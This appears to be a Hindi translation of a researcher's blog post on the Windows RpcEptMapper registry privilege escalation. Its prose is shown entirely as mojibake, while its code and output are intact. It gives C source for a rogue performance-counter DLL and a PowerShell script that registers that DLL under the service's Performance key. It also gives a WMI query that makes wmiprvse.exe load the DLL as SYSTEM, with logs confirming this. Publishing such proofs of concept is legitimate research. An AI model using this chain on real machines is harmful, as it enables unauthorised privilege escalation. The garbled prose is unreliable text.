рдмреЗрд╢рдХ, рдпрд╣ рд╣рдорд╛рд░реА рдЗрдЪреНрдЫрд╛ рдирд╣реАрдВ рд╣реИред рд╣рдо DLL рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, EXE рдирд╣реАрдВ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ `main` рдлрд╝рдВрдХреНрд╢рди рдХреЛ `DllMain` рдХреЗ рд╕рд╛рде рдмрджрд▓рдирд╛ рд╣реЛрдЧрд╛ред рдЖрдк рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрдХреЗрд▓реЗрдЯрди рдХреЛрдб рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [DLL рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░реЗрдВ](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll)ред
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
switch (reason)
{
case DLL_PROCESS_ATTACH:
Log(L"DllMain"); // See log helper function below
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
рд╕рд╛рде рд╣реА, рд╣рдореЗрдВ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рднреА рдмрджрд▓рдиреА рд╣реЛрдЧреА рддрд╛рдХрд┐ рдЖрдЙрдЯрдкреБрдЯ рдХрдВрдкрд╛рдЗрд▓ рдлрд╝рд╛рдЗрд▓ EXE рдХреА рдЬрдЧрд╣ DLL рд╣реЛред рдЗрд╕рдХреЗ рд▓рд┐рдП, рдЖрдк рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ "General" рдЦрдВрдб рдореЗрдВ, "Configuration Type" рдХреЗ рд░реВрдк рдореЗрдВ "Dynamic Library (.dll)" рдХреЛ рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВред рд╢реАрд░реНрд╖рдХ рдкрдЯреНрдЯреА рдХреЗ рдиреАрдЪреЗ, рдЖрдк "All Configurations" рдФрд░ "All Platforms" рднреА рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рд╕рднреА рд╡рд┐рдХрд▓реНрдкреЛрдВ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛ рд╕рдХреЗред

рдЕрдЧрд▓реЗ, рдореИрдВ рдЕрдкрдиреЗ рдХрд╕реНрдЯрдо рд▓реЙрдЧ рд╕рд╣рд╛рдпрдХ рдлрд╝рдВрдХреНрд╢рди рдЬреЛрдбрд╝рддрд╛ рд╣реВрдБред
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
LPWSTR pwszBuffer, pwszCommandLine;
WCHAR wszUsername[UNLEN + 1] = { 0 };
SYSTEMTIME st = { 0 };
HANDLE hToolhelpSnapshot;
PROCESSENTRY32 stProcessEntry = { 0 };
DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
BOOL bResult = FALSE;

// Get the command line of the current process
pwszCommandLine = GetCommandLine();

// Get the name of the process owner
GetUserName(wszUsername, &dwPcbBuffer);

// Get the PID of the current process
dwProcessId = GetCurrentProcessId();

// Get the PID of the parent process
hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
do {
if (stProcessEntry.th32ProcessID == dwProcessId) {
dwParentProcessId = stProcessEntry.th32ParentProcessID;
break;
}
} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
}
CloseHandle(hToolhelpSnapshot);

// Get the current date and time
GetLocalTime(&st);

// Prepare the output string and log the result
dwBufSize = 4096 * sizeof(WCHAR);
pwszBuffer = (LPWSTR)malloc(dwBufSize);
if (pwszBuffer)
{
StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
st.wHour,
st.wMinute,
st.wSecond,
dwProcessId,
dwParentProcessId,
wszUsername,
pwszCommandLine,
pwszCallingFrom
);

LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

free(pwszBuffer);
}
}
```
рддрдм рд╣рдо DLL рдХреЛ рддреАрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рд╕реЗ рднрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╣рдордиреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ рджреЗрдЦрд╛ рдерд╛ред рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдпрд╣ рднреА рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ рдпрджрд┐ рд╕рдлрд▓ рд╣реЛ рддреЛ рд╡реЗ `ERROR_SUCCESS` рд▓реМрдЯрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
Log(L"OpenPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
Log(L"CollectPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
Log(L"ClosePerfData");
return ERROR_SUCCESS;
}
```
рдареАрдХ рд╣реИ, рддреЛ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдЕрдм рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рд╣реЛ рдЧрдИ рд╣реИ, `DllMain` рдХреЛ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ рд▓реЙрдЧ рд╕рд╣рд╛рдпрдХ рдлрд╝рдВрдХреНрд╢рди рдФрд░ рддреАрди рдЖрд╡рд╢реНрдпрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИрдВред рд▓реЗрдХрд┐рди рдПрдХ рдЪреАрдЬрд╝ рдЕрднреА рднреА рдмрд╛рдХреА рд╣реИред рдпрджрд┐ рд╣рдо рдЗрд╕ рдХреЛрдб рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рддреЗ рд╣реИрдВ, `OpenPerfData`, `CollectPerfData` рдФрд░ `ClosePerfData` рдХреЗрд╡рд▓ рдЖрдВрддрд░рд┐рдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рд╣реА рдЙрдкрд▓рдмреНрдз рд╣реЛрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдЙрдиреНрд╣реЗрдВ **рдирд┐рд░реНрдпрд╛рдд** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЗрд╕реЗ рдХрдИ рддрд░реАрдХреЛрдВ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдПрдХ [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) рдлрд╝рд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рдЙрдЪрд┐рдд рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдореБрдЭреЗ рдЗрд╕ рдЫреЛрдЯреЗ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `__declspec(dllexport)` рдХреАрд╡рд░реНрдб ([рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЕрдЪреНрдЫрд╛ рд▓рдЧрддрд╛ рд╣реИред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ, рд╣рдореЗрдВ рдмрд╕ рд╕реНрд░реЛрдд рдХреЛрдб рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рддреАрди рдлрд╝рдВрдХреНрд╢рди рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
рдпрджрд┐ рдЖрдк рдкреВрд░рд╛ рдХреЛрдб рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдореИрдВрдиреЗ рдЗрд╕реЗ [рдпрд╣рд╛рдБ](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12) рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рд╣реИред

рдЕрдВрдд рдореЗрдВ, рд╣рдо _**Release/x64**_ рдФрд░ "_**Build the solution**_" рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рд╣рдорд╛рд░реА DLL рдлрд╝рд╛рдЗрд▓ рдЙрддреНрдкрдиреНрди рд╣реЛрдЧреА: `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`ред

## рдкреЛрд╕реА рдХрд╛ рдкрд░реАрдХреНрд╖рдг <a href="#testing-the-poc" id="testing-the-poc"></a>

рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдореИрдВ рд╣рдореЗрд╢рд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реВрдБ рдХрд┐ рдореЗрд░реЗ рдкреЗрд▓реЛрдб рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЗрд╕реЗ рдЕрд▓рдЧ рд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдХреЗред рдПрдХ рдЫреЛрдЯрд╛ рд╕рдордп рдпрд╣рд╛рдВ рдмрд┐рддрд╛рдиреЗ рд╕реЗ рдЖрдкрдХреЛ рдПрдХ рдХрд▓реНрдкрдирд╛рд╢реАрд▓ рдбреАрдмрдЧ рдЪрд░рдг рдХреЗ рджреМрд░рд╛рди рдЦреБрдж рдХреЛ рдЦреЛрдЦрд▓рд╛ рдЬрд╛рдиреЗ рд╕реЗ рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рдордп рдмрдЪрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдо рдЖрд╕рд╛рдиреА рд╕реЗ `rundll32.exe` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ DLL рдХрд╛ рдирд╛рдо рдФрд░ рдирд┐рд░реНрдпрд╛рддрд┐рдд рдХрд┐рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдирд╛рдо рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/09\_test-poc-rundll32.gif)

рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛, рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЧрдИ рд╣реИ рдФрд░ рдЕрдЧрд░ рд╣рдо рдЗрд╕реЗ рдЦреЛрд▓реЗрдВ рддреЛ рд╣рдореЗрдВ рджреЛ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпрд╛рдБ рджрд┐рдЦрд╛рдИ рджреЗрдВрдЧреАред рдкрд╣рд▓реА рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рддрдм рд▓рд┐рдЦреА рдЧрдИ рдереА рдЬрдм `rundll32.exe` рджреНрд╡рд╛рд░рд╛ DLL рд▓реЛрдб рдХреА рдЧрдИ рдереАред рджреВрд╕рд░реА рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рддрдм рд▓рд┐рдЦреА рдЧрдИ рдереА рдЬрдм `OpenPerfData` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЕрдЪреНрдЫрд╛ рд▓рдЧ рд░рд╣рд╛ рд╣реИ! ![:slightly\_smiling\_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
рдареАрдХ рд╣реИ, рдЕрдм рд╣рдо рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрдХрдЯ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдФрд░ рдорд╛рди рдмрдирд╛рдиреЗ рдХреА рд╢реБрд░реБрдЖрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдЗрд╕реЗ рдпрд╛ рддреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ `reg.exe` / `regedit.exe` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрдирд┐рдХ рд░реВрдк рд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдХреНрдпреЛрдВрдХрд┐ рдореИрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЕрдкрдиреЗ рдкреНрд░рд╛рдердорд┐рдХ рдЕрдиреБрд╕рдВрдзрд╛рди рдХреЗ рджреМрд░рд╛рди рдореИрдиреНрдпреБрдЕрд▓ рдЪрд░рдгреЛрдВ рд╕реЗ рдЧреБрдЬрд░ рдЪреБрдХрд╛ рд╣реВрдБ, рдореИрдВ рдПрдХ рд╕реНрд╡рдЪреНрдЫ рддрд░реАрдХрд╛ рджрд┐рдЦрд╛рдКрдВрдЧрд╛ рдЬрд┐рд╕рд╕реЗ рд╣рдо рдПрдХ рд╣реА рдЪреАрдЬ рдХреЛ рдкрд╛рд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкрд╛рд╡рд░рд╢реЗрд▓ рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдФрд░ рдорд╛рди рдмрдирд╛рдирд╛ `New-Item` рдФрд░ `New-ItemProperty` рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд╕рдорд╛рди рд╣реИ, рдХреНрдпрд╛ рдирд╣реАрдВ? ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`Requested registry access is not allowed`... рд╣рдореНрдореНрдо, рдареАрдХ рд╣реИ... рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдЗрддрдирд╛ рдЖрд╕рд╛рди рдирд╣реАрдВ рд╣реЛрдЧрд╛ред ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

рдореИрдВрдиреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕ рдореБрджреНрджреЗ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рд╣реИ рд▓реЗрдХрд┐рди рдореЗрд░рд╛ рдЕрдиреБрдорд╛рди рд╣реИ рдХрд┐ рдЬрдм рд╣рдо `New-Item` рдХреЛ рдмреБрд▓рд╛рддреЗ рд╣реИрдВ, рддреЛ `powershell.exe` рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрдмреЛрдзрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреБрдЫ рдзреНрд╡рдЬ рд▓реЗрдХрд░ рдорд╛рддрд╛-рдкрд┐рддрд╛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдХреЛ рдЦреЛрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред

рдлрд┐рд░ рднреА, рдпрджрд┐ рдЗрди рдирд┐рд░реНрдорд┐рдд cmdlets рдХрд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╣рдо рд╣рдореЗрд╢рд╛ рдПрдХ рд╕реНрддрд░ рдиреАрдЪреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕реАрдзреЗ DotNet рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрд╣реНрд╡рд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЗ рд╕рд╛рде рдкрд╛рд╡рд░рд╢реЗрд▓ рдореЗрдВ рдмрдирд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИред
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/11\_powershell-dotnet-createsubkey.png)

рдЪрд▓реЛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ! рдЕрдВрдд рдореЗрдВ, рдореИрдВрдиреЗ рдЙрдЪрд┐рдд рдХреБрдВрдЬреА рдФрд░ рдорд╛рдиреЛрдВ рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рд╣реИ, рдХреБрдЫ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдФрд░ рдЕрдВрдд рдореЗрдВ рд╕рдм рдХреБрдЫ рд╕рд╛рдл рдХрд░рдХреЗ рд╕рдорд╛рдкреНрдд рдХрд░реЗрдВред
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
рдЕрдм рдЖрдЦрд┐рд░реА рдХрджрдо, **рд╣рдо RPC Endpoint Mapper рд╕реЗрд╡рд╛ рдХреЛ рдХреИрд╕реЗ рдзреЛрдЦрд╛ рджреЗрдВрдЧреЗ рддрд╛рдХрд┐ рд╣рдорд╛рд░рд╛ Performace DLL рд▓реЛрдб рд╣реЛ рдЬрд╛рдП?** рджреБрдГрдЦ рдХреА рдмрд╛рдд рд╣реИ, рдореИрдВрдиреЗ рд╕рднреА рд╡рд┐рднрд┐рдиреНрди рдЪреАрдЬреЛрдВ рдХрд╛ рдЯреНрд░реИрдХ рдирд╣реАрдВ рд░рдЦрд╛ рд╣реИ рдЬреЛ рдореИрдВрдиреЗ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдПред рдпрд╣ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдпрд╣ рджрд┐рдЦрд╛рдирд╛ рдмрд╣реБрдд рд░реЛрдЪрдХ рд╣реЛрддрд╛ рдХрд┐ рдЕрдиреБрд╕рдВрдзрд╛рди рдХрд┐рддрдирд╛ рдердХрд╛рдК рдФрд░ рд╕рдордп рд▓реЗрдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдлрд┐рд░ рднреА, рдореИрдВрдиреЗ рд░рд╛рд╕реНрддреЗ рдореЗрдВ рдПрдХ рдЪреАрдЬрд╝ рдЦреЛрдЬреА рд╣реИ рдХрд┐ рдЖрдк WMI (Windows Management Instrumentation) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ _Perfomance Counters_ рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдмрд╣реБрдд рд╣реА рдЖрд╢реНрдЪрд░реНрдпрдЬрдирдХ рдирд╣реАрдВ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ рдорд┐рд▓реЗрдЧреА: [_WMI Performance Counter Types_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).

> _рдХрд╛рдЙрдВрдЯрд░ рдкреНрд░рдХрд╛рд░ Win32_PerfRawData рдХрдХреНрд╖рд╛рдУрдВ рдореЗрдВ рдЧреБрдгрд╛рдВрдХ рдкреНрд░рдХрд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ Win32_PerfFormattedData рдХрдХреНрд╖рд╛рдУрдВ рдореЗрдВ рдЧреБрдгрд╛рдВрдХ рдкреНрд░рдХрд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ CookingType рдЧреБрдгрд╛рдВрдХ рдкреНрд░рдХрд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрддреЗ рд╣реИрдВред_

рддреЛ, рдореИрдВрдиреЗ рдкрд╣рд▓реЗ PowerShell рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ _Performace Data_ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд WMI рдХрдХреНрд╖рд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХреАред
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12\_powershell-get-wmiobject.gif)

рдФрд░, рдореИрдВрдиреЗ рджреЗрдЦрд╛ рдХрд┐ рдореЗрд░реА рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рддреБрд░рдВрдд рдмрдирд╛рдИ рдЧрдИ рдереА! рдпрд╣рд╛рдВ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╣реИред
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
